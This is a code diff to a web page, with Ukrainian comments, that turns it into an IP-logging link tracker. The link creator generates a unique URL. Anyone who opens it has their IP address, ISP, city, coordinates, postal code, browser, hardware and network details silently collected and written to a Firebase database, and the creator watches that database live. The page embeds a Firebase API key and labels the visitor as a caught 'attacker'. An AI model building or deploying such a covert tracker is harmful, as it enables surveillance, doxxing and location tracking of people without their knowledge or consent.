@@ -178,7 +178,6 @@
   }
 </style>
 
-<!-- Підключаємо Firebase через стабільні CDN скрипти (працюють навіть локально) -->
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 </head>
@@ -190,7 +189,7 @@
     <div class="clock" id="clock">—</div>
   </div>
 
-  <!-- Блок створення посилання -->
+  <!-- Блок створення посилання (видно тільки на головній без ?id) -->
   <div class="generator-box" id="genBox">
     <h3>Створити персональне посилання</h3>
     <button class="btn" id="genBtn">Згенерувати лінк</button>
@@ -250,7 +249,6 @@
 </div>
 
 <script>
-  // Конфіг твого Firebase
   const firebaseConfig = {
     apiKey: "AIzaSyAJlMZuzlxdL9Y2z2nmbWVEDN-SIQ7AwSc",
     authDomain: "ip-end.firebaseapp.com",
@@ -262,18 +260,13 @@
     measurementId: "G-PX4C45YZ93"
   };
 
-  // Ініціалізація
   firebase.initializeApp(firebaseConfig);
   const db = firebase.database();
 
-  // Годинник
   setInterval(() => {
     const el = document.getElementById('clock');
     if(el) el.textContent = new Date().toLocaleTimeString('uk-UA');
   }, 1000);
-
-  const urlParams = new URLSearchParams(window.location.search);
-  const targetId = urlParams.get('id');
 
   function displayData(d) {
     document.getElementById('heroIp').textContent = d.ip || '—';
@@ -295,94 +288,101 @@
     document.getElementById('ua').textContent = d.ua || '—';
   }
 
-  async function run() {
-    if (targetId) {
-      // Режим перегляду звіту за ID
-      document.getElementById('genBox').style.display = 'none';
-      document.getElementById('heroLabel').textContent = 'Звіт за посиланням (ID: ' + targetId + ')';
-      document.getElementById('heroLoc').textContent = 'Очікування даних від кліка...';
+  async function collectMyData() {
+    const data = {
+      ua: navigator.userAgent,
+      platform: navigator.platform || 'невідомо',
+      language: navigator.language || '—',
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '—',
+      cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' ядер' : '—',
+      ram: navigator.deviceMemory ? '~' + navigator.deviceMemory + ' GB' : '—',
+      online: navigator.onLine ? 'Online' : 'Offline',
+      webdriver: navigator.webdriver ? 'ТАК (Бот)' : 'Ні (Людина)',
+      time: new Date().toISOString(),
+      ip: 'збирається...'
+    };
 
-      db.ref('logs/' + targetId).on('value', (snapshot) => {
-        const val = snapshot.val();
-        if (val && val.ip && val.ip !== 'збирається...') {
-          displayData(val);
-        } else if (val && val.status) {
-          document.getElementById('heroLoc').textContent = val.status;
-        }
-      });
+    const conn = navigator.connection || navigator.mozConnection;
+    if(conn) {
+      data.netType = conn.effectiveType ? conn.effectiveType.toUpperCase() : '—';
+      data.netSpeed = `${conn.downlink || '?'} Mbps`;
+    } else {
+      data.netType = '—';
+      data.netSpeed = '—';
+    }
+
+    try {
+      const r = await fetch('https://ipapi.co/json/');
+      if(r.ok) {
+        const d = await r.json();
+        data.ip = d.ip || '—';
+        data.isp = d.org || '—';
+        data.country = d.country_name || '—';
+        data.city = d.city || '—';
+        data.coords = (d.latitude && d.longitude) ? `${d.latitude}, ${d.longitude}` : '—';
+        data.zip = d.postal || '—';
+      }
+    } catch(e) {
+      try {
+        const r2 = await fetch('https://api.ipify.org?format=json');
+        const d2 = await r2.json();
+        data.ip = d2.ip;
+      } catch(err) {
+        data.ip = 'Не вдалося визначити';
+      }
+    }
+    return data;
+  }
+
+  async function init() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetId = urlParams.get('id');
+
+    if (targetId) {
+      // СЦЕНАРІЙ А: Це хтось відкрив згенерований лінк
+      document.getElementById('genBox').style.display = 'none';
+      document.getElementById('heroLabel').textContent = 'Звіт передано (ID: ' + targetId + ')';
+
+      const myData = await collectMyData();
+      displayData(myData);
+
+      db.ref('logs/' + targetId).set(myData)
+        .then(() => console.log('Дані успішно полетіли у базу!'))
+        .catch(err => console.error('Помилка запису:', err));
 
     } else {
-      // Режим збору даних (коли хтось відкрив лінк)
-      const data = {
-        ua: navigator.userAgent,
-        platform: navigator.platform || 'невідомо',
-        language: navigator.language || '—',
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '—',
-        cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' ядер' : '—',
-        ram: navigator.deviceMemory ? '~' + navigator.deviceMemory + ' GB' : '—',
-        online: navigator.onLine ? 'Online' : 'Offline',
-        webdriver: navigator.webdriver ? 'ТАК (Бот)' : 'Ні (Людина)',
-        time: new Date().toISOString(),
-        ip: 'збирається...'
-      };
-
-      const conn = navigator.connection || navigator.mozConnection;
-      if(conn) {
-        data.netType = conn.effectiveType ? conn.effectiveType.toUpperCase() : '—';
-        data.netSpeed = `${conn.downlink || '?'} Mbps`;
-      } else {
-        data.netType = '—';
-        data.netSpeed = '—';
-      }
-
-      try {
-        const r = await fetch('https://ipapi.co/json/');
-        if(r.ok) {
-          const d = await r.json();
-          data.ip = d.ip || '—';
-          data.isp = d.org || '—';
-          data.country = d.country_name || '—';
-          data.city = d.city || '—';
-          data.coords = (d.latitude && d.longitude) ? `${d.latitude}, ${d.longitude}` : '—';
-          data.zip = d.postal || '—';
-        }
-      } catch(e) {
-        try {
-          const r2 = await fetch('https://api.ipify.org?format=json');
-          const d2 = await r2.json();
-          data.ip = d2.ip;
-        } catch(err) {
-          data.ip = 'Не вдалося визначити';
-        }
-      }
-
-      displayData(data);
-
-      const activeId = new URLSearchParams(window.location.search).get('id');
-      if (activeId) {
-        db.ref('logs/' + activeId).set(data)
-          .then(() => console.log('Дані успішно полетіли у Firebase!'))
-          .catch(err => console.error('Помилка запису:', err));
-      }
+      // СЦЕНАРІЙ Б: Ти заходиш на головну
+      const myData = await collectMyData();
+      displayData(myData);
     }
   }
 
-  run();
+  init();
 
-  // Кнопка генерації
+  // Кнопка генерації (баг виправлено: використані зворотні лапки ` ` замість ' ')
   document.getElementById('genBtn').addEventListener('click', () => {
     const randomId = Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 8);
     
-    db.ref('logs/' + randomId).set({ status: 'Очікування переходу...' });
-
-    // Якщо ти ще не підключив Гітхаб, беремо поточний шлях або базовий рядок
     const currentUrl = window.location.protocol === 'file:' 
-      ? 'https://simdomyt.github.io/ip-end/' // залиш свою ссилку коли закинеш на гітхаб
+      ? 'https://simdomyt.github.io/ip-end/index.html' 
       : window.location.origin + window.location.pathname;
 
     const uniqueLink = `${currentUrl}?id=${randomId}`;
     
     document.getElementById('genResult').innerHTML = `Твоє посилання:<br><a href="${uniqueLink}" target="_blank" style="color: var(--accent);">${uniqueLink}</a>`;
+    document.getElementById('heroLabel').textContent = `Очікування переходу за лінком...`;
+    
+    // ОСЬ ТУТ БУЛА ПОМИЛКА ЧЕРЕЗ АПОСТРОФ У СЛОВІ "з'являться"
+    document.getElementById('heroLoc').textContent = `Як тільки хтось відкриє лінк, дані з'являться тут у реальному часі!`;
+
+    // Слухаємо базу
+    db.ref('logs/' + randomId).on('value', (snapshot) => {
+      const val = snapshot.val();
+      if (val && val.ip && val.ip !== 'збирається...') {
+        document.getElementById('heroLabel').textContent = `Зловмисник піймався! Отримані дані:`;
+        displayData(val);
+      }
+    });
   });
 </script>
 </body>
